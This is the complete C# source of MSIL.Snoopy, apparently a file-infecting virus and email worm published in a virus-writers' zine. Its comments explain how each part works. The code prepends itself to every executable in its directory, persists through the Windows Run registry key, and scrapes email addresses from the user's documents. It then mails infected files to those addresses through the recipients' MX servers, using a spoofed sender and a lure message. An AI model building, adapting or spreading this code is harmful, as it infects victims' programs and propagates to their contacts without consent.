   /*************************************************************
    * C# - MSIL.Snoopy
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    * by free0n
    * vx13d.net free0n@vx13d.net
    * ###########################################################
    * ++Snoopy++
    *
    * Snoopy replicates files that are in it's current directory
    * after it has done it's prepending it then checks the registry
    * to see if it's mass mailing has already run. If it hasn't it
    * spawns a new thread to send itself out. The stmp engine will
    * search for emails in the my documents folder and does a dns
    * lookup for mx records based on the email host it finds
    * ex. you@hotmail.com woud look for hotmail.com mail servers.
    * After the sending, if the day is equal to 8 it will display
    * a message to the user that they have been infected.
    *
    * Note: Yes this looks like a console application which
    * would have a command prompt or dos box open but with
    * Snoopy you create the Console application then change
    * the output type to windows form (its in project properties).
    * This makes it so it still runs like a console app but
    * no dos box opens making it a little more sneaky
    * Use VC# express to build...
    *
    * Thanks to all the RRLF peeps for letting me
    * contribute to their kick ass mag. Keep vxing :)
    *
    * Lates!
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/

   /************************************************************
    * Start of Program.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/

   using System;
   using System.Collections.Generic;
   using System.Text;
   using System.IO;
   using System.Threading;

   namespace Snoopy {

       class Program {

           private static string myDir = Directory.GetCurrentDirectory();
           private static Thread t;

           static void Main(string[] args) {
               Snoopy snoopy = new Snoopy();
               snoopy.Replicate(myDir);
               if (snoopy.CheckReg()) {
                   t = new Thread(new ThreadStart(snoopy.Send));
                   t.Start();
               }
               if (DateTime.Now.Day == 8) {
                   snoopy.Message();
               }
           }
       }
   }

   /************************************************************
    * Start of Snoopy.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/

   using System;
   using System.Collections.Generic;
   using System.Text;
   using System.IO;
   using System.Diagnostics;
   using System.Windows.Forms;
   using Microsoft.Win32;
   using System.Collections;
   using System.Threading;
   using System.Text.RegularExpressions;
   using System.Net.Mail;
   using System.Runtime.InteropServices;

   namespace Snoopy {

       class Snoopy {

           private string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
           private string myDocs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

           //store the emails we find in myDocs folder and store the infected files in arInfect
           private ArrayList arrEmails = new ArrayList();
           private ArrayList arInfect = new ArrayList();


           //we must import the dns dll since .net doesn't have what were looking for :(
           [DllImport("dnsapi", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]
           private static extern int Dns([MarshalAs(UnmanagedType.VBByRefStr)]ref string strName, int intType, int intOpt, int intServer, ref IntPtr pResult, int intReserved);


           //our check to the registry if we ran it already..
           public bool CheckReg() {
               string rK = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
               string rS = (string)Registry.GetValue(rK, "Snoopy", "Snoopy");
               if (rS == "Snoopy") {
                   Registry.SetValue(rK, "Snoopy", me);
                   return true;
               } else {
                   return false;
               }
           }

           //my super little message add the windows form reference for messagbox
           public void Message() {
              MessageBox.Show("Infected with MSIL.Snoopy", "Snoopy");
           }

           //replication for the directory which we pass in in program.cs
           public void Replicate(string dir) {

               //replication method will target all exe's inside the directory
               //that we passed in dth. It's the current programs dir. So it
               //will target all exectuables wherever it's ran in.
               FileStream fiVirus = new FileStream(me, FileMode.Open, FileAccess.Read);
               BinaryReader brVirus = new BinaryReader(fiVirus);

               byte[] virBytes = new byte[fiVirus.Length];

               //read the virus into the virBytes
               for (int v = 0; v < virBytes.Length; v++) {
                   virBytes[v] = brVirus.ReadByte();
               }

               //close streams, very important or else we get file in use errors..
               fiVirus.Close();
               brVirus.Close();

               string[] files = Directory.GetFiles(dir, "*.exe");
               //for all the exe's we find in the directory
               for (int i = 0; i < files.Length; i++) {

                   //get and retrieve the host data and store it into a byte array so we can
                   //use it later
                   FileStream fsHost = new FileStream(files[i], FileMode.Open, FileAccess.Read);
                   BinaryReader brHost = new BinaryReader(fsHost);

                   //reading host data into hostBytes byte array
                   byte[] hostBytes = new byte[fsHost.Length];
                   for (int h = 0; h < hostBytes.Length; h++) {
                       hostBytes[h] = brHost.ReadByte();
                   }

                   //close streams
                   brHost.Close();
                   fsHost.Close();

                   //this is our check I guess if the app is byte 60 is 128 don't infect
                   //if it is then we must infect
                   if (hostBytes[60] != 128) {

                       //here we write the virus first then we write the rest of the host
                       //this is so later we can retrieve the first part of the virus and
                       //execute and then run our temp program.
                       FileStream fswHost = new FileStream(files[i], FileMode.Open, FileAccess.Write);
                       BinaryWriter bwHost = new BinaryWriter(fswHost);

                       //note:basestream is used here so we can use the WriteByte method
                       for (int v = 0; v < virBytes.Length; v++) {
                           bwHost.BaseStream.WriteByte(virBytes[v]);
                       }

                       for (int hh = 0; hh < hostBytes.Length; hh++) {
                           bwHost.BaseStream.WriteByte(hostBytes[hh]);
                       }

                       //close both streams
                       bwHost.Close();
                       fsHost.Close();

                       //add the infected file to the arraylist
                       arInfect.Add(files[i]);
                   }
               }

               //fileinfo makes getting filesizes easy :)
               FileInfo fi = new FileInfo(me);

               //we use size to tell if it's the original program
               //or an infected file this comes in handy mostly for
               //debugging
               int size = (int)fi.Length - 20480;

               if (size <= 0) {
                   //this is the original program and error out | note: this will occur after it's already infected other exe's
                   MessageBox.Show("Not a valid win32 program", "Windows", MessageBoxButtons.OK, MessageBoxIcon.Error);
                   Application.Exit();
               } else {
                   //this is a duplicate copy of the program so we need to do is
                   //read the program starting with the end of the virus to the end of the file.
                   //then output those bytes into a temp file and execute it.
                   try {

                       //create a random file name based on hourse, second, minute so should be like 605.exe or somethin
                       string tmp = DateTime.Now.Hour + DateTime.Now.Second + DateTime.Now.Minute + ".exe";
                       FileStream fsTemp = new FileStream(tmp, FileMode.CreateNew);
                       File.SetAttributes(tmp, FileAttributes.Hidden);

                       //since we know the size of our program we can use it to skip down to the end
                       //which is the start of the original application we infected then we just have
                       //to write out the rest of the bytes..
                       for (int t = 20480; t < fi.Length; t++)
                       {
                           fsTemp.WriteByte(virBytes[t]);
                       }
                       fsTemp.Close();

                       //after the temp file is written were gonna execute it so the user
                       //doesn't get suspicious.
                       try
                       {
                           Process.Start(tmp).WaitForExit();
                       }
                       catch (Exception er)
                       {
                           MessageBox.Show("This file is corrupt", "Windows", MessageBoxButtons.OK, MessageBoxIcon.Error);
                       }

                       //delete the temp file after it exits. We don't want to reinfect
                       //it when they run us again.
                       File.Delete(tmp);

                       //Exit after we are done with our temp file
                       Application.Exit();

                   } catch (Exception argh) { }
               }
           }

           public void Send() {

               //returns all the emails we search for in the users my docs folder
               arrEmails = SearchEmails(myDocs, "*.*");

               //reverse the order that we send so that
               //it can send to other emails.
               ArrayList arrFrom = arrEmails;
               arrFrom.Reverse();

               string file = GetFile();

               if (file != "") {
                   if (arrEmails.Count > 0) {
                       //if we got an infected file and some emails lets send
                       Attachment data = new Attachment(file);
                       IEnumerator myEnum = arrEmails.GetEnumerator();

                       string toAddy = "";
                       string fromAddy = "";

                       //email list we already sent out to
                       ArrayList arSent = new ArrayList();

                       //loop each email we found
                       while (myEnum.MoveNext()) {

                           toAddy = Convert.ToString(myEnum.Current);
                           IEnumerator fromEnum = arrFrom.GetEnumerator();

                           while (fromEnum.MoveNext()) {

                               fromAddy = Convert.ToString(fromEnum.Current);

                               //check to make sure the from and to addys aren't the same..
                               if (toAddy != fromAddy) {
                                   //make sure we already haven't sent it to this host
                                   if (!arSent.Contains(toAddy)) {

                                       arSent.Add(toAddy);

                                       //mail settings
                                       MailAddress to = new MailAddress(toAddy);
                                       MailAddress from = new MailAddress(fromAddy);

                                       MailMessage message = new MailMessage(from, to);
                                       message.Subject = "Hey";

                                       //snoopys lame message body that will easily trick users into running it muwhahaha
                                       message.Body = "Hey hows it going? I attached that file you were asking about. Let me know if it worKs for you or not. I'm not sure what I'm going to do the tommorow maybe get some coffee and do some shopping. Well give me a call later okay?";
                                       message.Attachments.Add(data);

                                       //call the GetMXRecords("@hotmail.com") method so we know what mail server to send to
                                       string host = toAddy.Substring(toAddy.IndexOf("@")).Replace("@", String.Empty);
                                       string mailMxHost = GetMXRecords(host);

                                       try {
                                           //send it!
                                           SmtpClient client = new SmtpClient(mailMxHost);
                                           client.Send(message);

                                       } catch (Exception er) {
                                           continue;
                                       }
                                   }
                               }
                           }
                       }

                       data.Dispose();
                   }
               }
           }

           //search emails method pass a dir and filetype
           //then we read each file line by line and each
           //line gets checked for emails. If we find an
           //email and it doesn't exist already in the
           //arraylist we add it.

           private ArrayList SearchEmails(string dir, string fileType) {
               ArrayList arEmails = new ArrayList();
               DirectoryInfo dr = new DirectoryInfo(dir);
               FileInfo[] filesInDir = dr.GetFiles(fileType);
               foreach (FileInfo file in filesInDir) {
                   Console.WriteLine(file.FullName);
                   StreamReader sr = File.OpenText(file.FullName);
                   String input;
                   while ((input = sr.ReadLine()) != null) {
                       string email = ExtractAddr(input);
                       if (email != "") {
                          if (!arEmails.Contains(email)) {
                               //regex validation we revalidate our found emails again
                               //to make sure that what was returned was correct.
                               string strValGex = @"^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}" +
                                                  @"\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\" +
                                                  @".)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$";

                               Regex regVal = new Regex(strValGex);
                               //if match and doesn't exist yet in the arraylist add it.
                               if (regVal.IsMatch(email)) {
                                   if (!arEmails.Contains(email)) {
                                       arEmails.Add(email);
                                   }
                               }
                           }
                       }
                   }
               }

               return arEmails;
           }

           public string ExtractAddr(string InputData) {
               /*** genetix's email extractor thx u ;) ***/
               string tmpExtractAddr = null;
               int AtPos, p1, p2, n = 0;
               string tmp = null;
               AtPos = (InputData.IndexOf("@", 0) + 1);
               p1 = 1;
               p2 = InputData.Length;
               tmpExtractAddr = "";
               if (AtPos == 0)
                   return tmpExtractAddr;

               for (n = (AtPos - 1); n >= 1; n--) {
                   tmp = InputData.Substring(n - 1, 1);
                   if ((tmp == " ") | (tmp == "<") | (tmp == "(") | (tmp == ":") | (tmp == ",") | (tmp == "[")) {
                       p1 = n + 1;
                       break;
                   }
               }

               for (n = (AtPos + 1); n <= InputData.Length; n++) {
                   tmp = InputData.Substring(n - 1, 1);
                   if ((tmp == " ") | (tmp == ">") | (tmp == ")") | (tmp == ":") | (tmp == ",") | (tmp == "]")) {
                       p2 = n - 1;
                       break;
                   }
               }

               //strip out any html and do some extra clean up
               string email = InputData.Substring(p1 - 1, (p2 - p1) + 1);
               email = Regex.Replace(email, @"<(.|\n)*?>", string.Empty);
               email = email.Replace(" ", "");
               email = email.Replace(" ", "");
               email = email.Replace(@"""", "");

               return email;
           }

           //since we don't need to send the exact copy we can just
           //send a file that was infected we get a file from the
           //infected arraylist.
           private string GetFile() {
               string dest = "";
               if (arInfect.Count > 0) {
                   IEnumerator enumInfect = arInfect.GetEnumerator();
                   while (enumInfect.MoveNext()) {
                       dest = Convert.ToString(enumInfect.Current);
                   }
               }
               return dest;
           }

           /***
            * Dns mx query used for the mass mailing we get the hosts
            * from the host portion of the emails we get. This way we
            * aren't hard coding mail servers or any junk like that.
            * If it doesn't find a mx record then we try the original
            * host that we passed in.
            ***/
           public string GetMXRecords(string host) {
               IntPtr p1 = IntPtr.Zero;
               IntPtr p2 = IntPtr.Zero;
               STRMX mx;

               int num1 = Dns(ref host, 15, 8, 0, ref p1, 0);
               string server = "";

               if (num1 != 0) {
                   server = host;
               } else {
                   for (p2 = p1; !p2.Equals(IntPtr.Zero); p2 = mx.pNext) {
                       mx = (STRMX)Marshal.PtrToStructure(p2, typeof(STRMX));
                       if (mx.sType == 15) {
                           string text1 = Marshal.PtrToStringAuto(mx.pNameEx);
                           if (text1 != "") {
                               server = text1;
                           }
                       }
                   }
               }
               return server;
           }

           //our struct for GetMxRecords
           private struct STRMX {
               public IntPtr pNext;
               public string strName;
               public short sType;
               public int intFlag;
               public int intTTL;
               public int intRes;
               public IntPtr pNameEx;
           }
       }
   }
